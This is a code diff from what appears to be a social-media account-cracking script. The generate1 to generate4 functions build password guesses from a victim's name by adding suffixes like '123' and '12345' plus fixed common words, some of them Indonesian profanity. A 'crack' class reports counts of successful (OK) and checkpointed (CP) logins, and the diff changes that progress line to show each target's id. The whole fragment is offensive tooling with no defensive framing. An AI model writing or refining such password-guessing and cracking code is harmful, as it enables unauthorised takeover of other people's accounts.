@@ -534,9 +534,7 @@ def generate1(_laura_):
             if len(i)==3 or len(i)==4 or len(i)==5:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
-                _aangxd_.append(i+"234")
             elif len(i)>=6:
-                _aangxd_.append("anjing")
                 _aangxd_.append("kontol")
                 _aangxd_.append("sayang")
             else:
@@ -553,14 +551,11 @@ def generate2(_laura_):
             if len(i)==3 or len(i)==4 or len(i)==5:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
-                _aangxd_.append(i+"234")
             else:
                 _aangxd_.append(i)
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
-                _aangxd_.append(i+"234")
     _aangxd_.append(_laura_.lower())
-    _aangxd_.append("anjing")
     _aangxd_.append("kontol")
     _aangxd_.append("sayang")
     return _aangxd_
@@ -574,13 +569,10 @@ def generate3(_laura_):
             if len(i)==3 or len(i)==4 or len(i)==5:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
-                _aangxd_.append(i+"234")
             else:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
-                _aangxd_.append(i+"234")
     _aangxd_.append(_laura_.lower())
-    _aangxd_.append("anjing")
     _aangxd_.append("kontol")
     _aangxd_.append("sayang")
     return _aangxd_
@@ -594,11 +586,9 @@ def generate4(_laura_):
         elif len(i)==3 or len(i)==4 or len(i)==5:
                 _aangxd_.append(i+"123")
                 _aangxd_.append(i+"12345")
-                _aangxd_.append(i+"234")
         else:
            _aangxd_.append(i+"123")
            _aangxd_.append(i+"12345")
-           _aangxd_.append(i+"234")
     if pp in ['',' ','  ']:pass
     else:
         for z in ps.split(','):
@@ -1084,7 +1074,7 @@ class crack:
                 else:continue
                     
             self.ko+=1
-            print("\r%s[••][%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end=' ');sys.stdout.flush()
+            print("\r%s[%s%s%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(O,P,fl.get("id"),O,P,self.ko,len(self.fl),O,P,len(self.ada),O,P,len(self.cp),O,P), end='');sys.stdout.flush()
         except:
             self.api(fl)
     def api_opsi(self,fl):
